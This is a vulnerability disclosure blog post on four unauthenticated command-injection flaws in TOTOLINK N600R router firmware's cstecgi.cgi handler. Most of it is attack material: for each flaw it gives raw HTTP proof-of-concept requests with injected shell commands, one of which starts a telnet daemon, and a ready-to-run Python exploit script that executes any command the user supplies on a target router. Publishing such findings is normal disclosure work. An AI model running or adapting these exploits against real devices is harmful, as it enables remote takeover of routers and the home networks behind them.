---
title: TOTOLINK_N600R_Command_Injection
date: 2022-02-21 17:11:22
tags: TOTOLINK
---

# TOTOlink N600R Comand Injection

#### Venda

ToTolink N600R http://totolink.net/home/menu/detail/menu_listtpl/download/id/160/ids/36.html

link :http://totolink.net/data/upload/20200728/5fa781d2e6a17e1ed1cbf6f169810809.zip

Name:TOTOLINK_C8160R-1C_N600R_IP04291_8196D_SPI_4M32M_V4.3.0cu.7570_B20200620_ALL.web

ToTolink 7100RU:

Firmware_link: http://totolink.net/home/menu/detail/menu_listtpl/download/id/185/ids/36.html

Name: TOTOLINK_C8540R-1C_A7100RU_IP04365_MT7621AMT7615Ex2_SPI_16M128M_V7.4cu.2313_B20191024_ALL.web

### Vulnerability1

#### Detail

​	In TOTOLINK N600R equipment cstecgi.cgi  file has command injection at the exportovpn interface, which can lead to unauthenticated RCE

<!--more-->

​	Received the environment variable QUERY_STRING in the cstecgi.cgi binary file, which is the URL to visit

<img src="https://raw.githubusercontent.com/doudoudedi/blog-img/master/img/image-20211111143526075.png" alt="image-20211111143526075" style="zoom:50%;" />

Later, it will be judged whether there is exportOvpn, and it is found that it can cause command injection by constructing a url request

<img src="https://raw.githubusercontent.com/doudoudedi/blog-img/master/img/image-20211111142430082.png" alt="image-20211111142430082" style="zoom:50%;" />

#### POC

```
POST /cgi-bin/cstecgi.cgi?exportOvpn=&type=user&comand=;touch${IFS}1.txt;&filetype=gz HTTP/1.1
Host: 192.168.0.254
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

aaaaa
```

#### EXP

```
import sys
import requests
import json
command=sys.argv[1]
try:
	ip=sys.argv[1]
	port=sys.argv[2]
	command=sys.argv[3]
except:
	print "nonono! cant't do this"
	print "please use python exp.py [ip] [port] [command]"
	exit()
url="http://%s:%s/cgi-bin/cstecgi.cgi?exportOvpn=&type=user&comand=;%s;&filetype=gz"%(ip,port,command)


headers={
	"User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0",
	"Accept-Language":"en-US,en;q=0.5",
	"Accept-Encoding":"gzip, deflate",
	"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
	"X-Requested-With":"XMLHttpRequest",
	"Origin":"http://%s:%s"%(ip,port),
}


requests.post(url,headers=headers)
```

#### verification

![image-20220221175918709](https://raw.githubusercontent.com/doudoudedi/blog-img/master/img/image-20220221175918709.png)

### Vulnerability2

#### Detail

​	In TOTOLINK N600R equipment ,The vulnerability lies in cstecgi.cgi JSON data can be passed in the function of testing Ping, resulting in unauthenticated RCE

<img src="https://raw.githubusercontent.com/doudoudedi/blog-img/master/img/image-20211111122344967.png" alt="image-20211111122344967" style="zoom:50%;" />

#### POC

```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.0.1
Connection: close
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0
Origin: http://192.168.0.1
Accept-Language: en-US,en;q=0.5
X-Requested-With: XMLHttpRequest
Referer: http://192.168.0.1/adm/diagnosis.asp?timestamp=1636595925423
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 95

{"topicurl": "setting/setDiagnosisCfg", "actionFlag": "1", "ipDoamin": "www.baidu.com\nreboot\n"}
```

#### EXP

```
import sys
import requests
import json
try:
	ip=sys.argv[1]
	port=sys.argv[2]
except:
	print "nonono! cant't do this"
	print "please use python exp.py [ip] [port] [command]"
	exit()
url="http://%s:%s/cgi-bin/cstecgi.cgi"%(ip,port)


command='ls -al'
headers={
	"User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0",
	"Accept-Language":"en-US,en;q=0.5",
	"Accept-Encoding":"gzip, deflate",
	"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
	"X-Requested-With":"XMLHttpRequest",
	"Origin":"http://%s:%s"%(ip,port),
}
data={
	"topicurl":"setting/setDiagnosisCfg",
	"actionFlag":"1",
	"ipDoamin":"www.baidu.com\n{}\n".format(command)
}


print requests.post(url,headers=headers,data=json.dumps(data)).text
```

#### verification

![image-20220221190506864](https://raw.githubusercontent.com/doudoudedi/blog-img/master/img/image-20220221190506864.png)

### Vulnerability3

#### Detail

​	In TOTOLINK N600R equipment, command injection at the change language of the login interface, which can lead to unauthenticated RCE

<img src="https://raw.githubusercontent.com/doudoudedi/blog-img/master/img/image-20211111141004575.png" alt="image-20211111141004575" style="zoom:50%;" />

#### POC

```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 79
Origin: http://192.168.0.1
Connection: close
Referer: http://192.168.0.1/title.asp

{"topicurl":"setting/setLanguageCfg","langType":"cn;telnetd${IFS}-p${IFS}23;"}	
```

#### EXP

```
import sys
import requests
import json
try:
	ip=sys.argv[1]
	port=sys.argv[2]
	command=sys.argv[3]
except:
	print "nonono! cant't do this"
	print "please use python exp.py [ip] [port] [command]"
	exit()
url="http://%s:%s/cgi-bin/cstecgi.cgi"%(ip,port)



headers={
	"User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0",
	"Accept-Language":"en-US,en;q=0.5",
	"Accept-Encoding":"gzip, deflate",
	"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
	"X-Requested-With":"XMLHttpRequest",
	"Origin":"http://%s:%s"%(ip,port),
	}
data={
	"topicurl":"setting/setLanguageCfg",
	"langType":"cn;{};".format(command)
}


requests.post(url,headers=headers,data=json.dumps(data))
```

#### verification

![image-20220221180334179](https://raw.githubusercontent.com/doudoudedi/blog-img/master/img/image-20220221180334179.png)

### Vulnerability4

#### Detail

​	In TOTOLINK N600R equipment,Command injection at setting/NTPSyncWithHost can lead to unauthenticated RCE

<img src="https://raw.githubusercontent.com/doudoudedi/blog-img/master/img/image-20211111141412938.png" alt="image-20211111141412938" style="zoom:50%;" />

#### POC

```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 83
Origin: http://192.168.0.1
Connection: close
Referer: http://192.168.0.1/adm/ntp.asp?timestamp=1636598045521
Cookie: SESSION_ID=2:1609945786:2

{"topicurl":"setting/NTPSyncWithHost","hostTime":"2021-11-11 10:34:09\"\nreboot\n\""}
```

#### EXP

```
import sys
import requests
import json
try:
	ip=sys.argv[1]
	port=sys.argv[2]
	command=sys.argv[3]
except:
	print "nonono! cant't do this"
	print "please use python exp.py [ip] [port] [command]"
	exit()
url="http://%s:%s/cgi-bin/cstecgi.cgi"%(ip,port)



headers={
	"User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0",
	"Accept-Language":"en-US,en;q=0.5",
	"Accept-Encoding":"gzip, deflate",
	"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
	"X-Requested-With":"XMLHttpRequest",
	"Origin":"http://%s:%s",
}
data={
	"topicurl":"setting/NTPSyncWithHost",
	"hostTime":"2021-11-11 10:34:09\"\n{}\n\"".format(command)
}


requests.post(url,headers=headers,data=json.dumps(data))
```

#### verification

![image-20220221190847543](https://raw.githubusercontent.com/doudoudedi/blog-img/master/img/image-20220221190847543.png)
